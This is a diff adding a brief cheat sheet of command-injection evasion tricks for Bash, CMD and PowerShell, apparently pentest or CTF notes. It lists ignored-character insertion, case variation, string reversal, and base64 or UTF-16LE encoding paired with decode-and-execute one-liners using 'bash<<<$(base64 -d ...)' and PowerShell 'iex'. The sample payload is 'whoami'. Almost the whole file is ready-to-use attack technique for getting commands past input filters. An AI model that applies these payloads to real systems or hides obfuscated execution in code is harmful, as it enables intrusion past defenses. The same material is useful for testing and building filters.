@@ -1,0 +1,21 @@
+##### Basic Command Bypassing #####
+ignored chars                  ' "                                                  BASH, Powershell
+ignored chars                  \ $@                                                 BASH
+ignored chars                  ^                                                    CMD
+case variations                WhOaMi                                                CMD, Powershell
+case variations                $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")                      BASH
+case variations                $(a="WhOaMi";printf %s "${a,,}")                      BASH
+reverse manipulation           $(rev<<<'imaohw')                                     BASH
+reverse manipulation           iex "$('imaohw'[-1..-20] -join '')"                   Powershell
+
+
+
+##### Base64 Encoding #####
+Linux BASH:             echo -n 'whoami' | base64 
+Linux Target:           bash<<<$(base64 -d<<<ExampleBase64strinG==)
+
+Linux BASH:              echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+Windows Target:          iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+
+
